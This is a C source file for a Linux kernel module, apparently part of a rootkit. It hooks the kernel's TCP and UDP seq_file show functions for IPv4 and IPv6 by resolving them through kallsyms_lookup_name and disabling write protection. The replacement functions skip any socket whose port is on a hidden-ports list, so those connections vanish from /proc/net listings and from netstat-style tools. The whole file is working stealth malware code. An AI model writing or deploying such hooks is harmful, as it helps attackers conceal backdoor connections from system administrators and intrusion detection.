#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>

#include "common.h"
#include "hook.h"
#include "sockhide.h"

port_list_t hidden_ports = {
    .port  = -1,
    .proto = -1,
    .prev = NULL,
    .next = NULL,
};

port_list_t_ptr hidden_ports_tail = &hidden_ports;


static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

static int g7_tcp4_seq_show(struct seq_file *, void *);
static int g7_tcp6_seq_show(struct seq_file *, void *);
static int g7_udp4_seq_show(struct seq_file *, void *);
static int g7_udp6_seq_show(struct seq_file *, void *);

void
hook_show(void)
{
    tcp4_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;

    tcp6_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;

    udp4_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;

    udp6_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;

    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)g7_tcp4_seq_show;
    
    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
        = (void *)g7_tcp6_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
        = (void *)g7_udp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
        = (void *)g7_udp6_seq_show;
    enable_protection();    
}

void
unhook_show(void)
{
    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)tcp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
        = (void *)tcp6_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
        = (void *)udp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
        = (void *)udp6_seq_show;
    enable_protection();
}

void 
hide_port(port_t port, proto proto)
{
    add_port_to_list(&hidden_ports, port, proto);
}

void
unhide_port(port_t port, proto proto)
{
    remove_port_from_list(&hidden_ports, port, proto);
}

bool
list_contains_port(port_list_t_ptr list, port_t port, proto proto)
{
    return !!find_port_in_list(list, port, proto);
}

port_list_t_ptr
find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
{
    port_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->port == port && i->proto == proto)
            return i;

    return NULL;
}

port_list_t_ptr
add_port_to_list(port_list_t_ptr tail, port_t port, proto proto)
{
    port_list_t_ptr node;
    node = (port_list_t_ptr)kmalloc(sizeof(port_list_t), GFP_KERNEL);

    if (node) {
        node->port = port;
        node->proto = proto;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_ports_tail = node;
        return node;
    }

    return NULL;
}

port_list_t_ptr
remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
{
    port_list_t_ptr i = find_port_in_list(list, port, proto), ret = NULL;

    if (i && (i->port != -1 && i->proto != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_ports_tail = i->prev ? i->prev : &hidden_ports;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}


//seq and v include all the info we need
//https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
//https://elixir.bootlin.com/linux/v4.19/source/net/ipv4/tcp_ipv4.c#L2385
static int
g7_tcp4_seq_show(struct seq_file *seq, void *v)
{
    //SEQ_START_TOKEN is used to indicate that a 
    //header will be returned first
    if(v == SEQ_START_TOKEN)
        return tcp4_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

    if(list_contains_port(&hidden_ports, src, tcp4)
    || list_contains_port(&hidden_ports, dst, tcp4))
        return 0;
    
    return tcp4_seq_show(seq, v);
}

//This following hooks are basically the same as above
static int
g7_tcp6_seq_show(struct seq_file *seq, void *v)
{
    if(v == SEQ_START_TOKEN)
        return tcp6_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

    if(list_contains_port(&hidden_ports, src, tcp6)
    || list_contains_port(&hidden_ports, dst, tcp6))
        return 0;
    
    return tcp6_seq_show(seq, v);
}

static int
g7_udp4_seq_show(struct seq_file *seq, void *v)
{
    if(v == SEQ_START_TOKEN)
        return udp4_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

    if(list_contains_port(&hidden_ports, src, udp4)
    || list_contains_port(&hidden_ports, dst, udp4))
        return 0;

    return udp4_seq_show(seq, v);
}

static int
g7_udp6_seq_show(struct seq_file *seq, void *v)
{
    if(v == SEQ_START_TOKEN)
        return udp6_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

   if(list_contains_port(&hidden_ports, src, udp6)
    || list_contains_port(&hidden_ports, dst, udp6))
        return 0;

    return udp6_seq_show(seq, v);
}